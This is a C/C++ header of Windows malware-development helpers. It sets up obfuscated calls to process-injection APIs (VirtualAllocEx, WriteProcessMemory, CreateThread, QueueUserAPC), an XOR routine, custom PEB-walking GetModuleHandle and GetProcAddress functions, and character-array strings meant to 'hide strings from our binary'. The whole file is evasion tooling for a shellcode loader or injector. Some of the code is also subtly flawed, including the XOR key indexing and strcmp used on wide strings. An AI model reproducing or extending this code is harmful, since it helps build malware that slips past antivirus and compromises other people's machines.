#pragma once

#include "Windows.h"

////////////////////////////////////////////////////////////////////
// 
// Function call obfuscation for Win32 API
// 
/////////////////////////////////////////////////////////////////////

typedef LPVOID(WINAPI* pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);
typedef BOOL(WINAPI* pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
	);
typedef HANDLE(WINAPI* pCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);

typedef DWORD(WINAPI* myQueueUserAPC)(
	IN PAPCFUNC  pfnAPC,
	IN HANDLE    hThread,
	IN ULONG_PTR dwData
	);

pVirtualAllocEx funcVirtualAlloc = (pVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "VirtualAllocEx");
pWriteProcessMemory funcWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "WriteProcessMemory");
pCreateThread funcCreateThread = (pCreateThread)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "CreateThread");

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

////////////////////////////////////////////////////////////////////
// 
// Structures for custom GetProcAddress/GetModuleHandle
// 
/////////////////////////////////////////////////////////////////////

//https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html#l00063
struct PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
};
//https://processhacker.sourceforge.io/doc/ntpebteb_8h_source.html#l00008
struct PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN SpareBits : 1;
		};
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PEB_LDR_DATA* Ldr;
	//...
};

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

//https://processhacker.sourceforge.io/doc/ntldr_8h_source.html#l00102
struct LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	//...
};

/////////////////////////////////////////////////////////////////////////////////////////
// 
// Advanced function obfuscation using Nt APIs and custom GetProcAddress/GetModuleHandle
// 
/////////////////////////////////////////////////////////////////////////////////////////


HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {

	// _M_IX86 Defined as the integer literal value 600 for compilations that target x86 processors. 
	// This macro isn't defined for x64 or ARM compilation targets.
	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB* ProcEnvBlk = (PEB*)__readfsdword(0x30);
#else
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
#endif

	PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;

	LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY ModuleList2 = Ldr->InMemoryOrderModuleList;

	LIST_ENTRY* pStartListEntry = ModuleList->Flink;
	LIST_ENTRY* pStartListEntry2 = ModuleList2.Flink;

	for (LIST_ENTRY* pListEntry = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
		pListEntry != ModuleList;	    	// walk all list entries
		pListEntry = pListEntry->Flink) {
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
		// check if module is found and return its base address
		if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)sModuleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}

	for (LIST_ENTRY* pListEntry = pStartListEntry2;  		// start from beginning of InMemoryOrderModuleList
		pListEntry != &ModuleList2;	    	// walk all list entries
		pListEntry = pListEntry->Flink) {
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
		// check if module is found and return its base address
		if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)sModuleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}
	getchar();
	return 0;
}

/**
* Get the function address of a module
*/
FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char* sProcName) {
	char* pBaseAddr = (char*)hMod;
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);
	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);
	// function address we're looking for
	void* pProcAddr = NULL;
	// resolve function by name	
		// parse through table of function names
	for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
		char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

		if (strcmp(sProcName, sTmpFuncName) == 0) {
			// found, get the function virtual address = RVA + BaseAddr
			pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
			break;
		}
	}
	return (FARPROC)pProcAddr;
}

typedef NTSTATUS(NTAPI* myNtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect);

typedef NTSTATUS(NTAPI* myNtWriteVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

// To hide strings from our binary
char alloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };

myNtAllocateVirtualMemory pNtAllocateVirtualMemory = (myNtAllocateVirtualMemory)hlpGetProcAddress(GetModuleHandleW(masterDLL), alloc);
myNtWriteVirtualMemory pNtWriteVirtualMemory = (myNtWriteVirtualMemory)hlpGetProcAddress(GetModuleHandleW(masterDLL), write);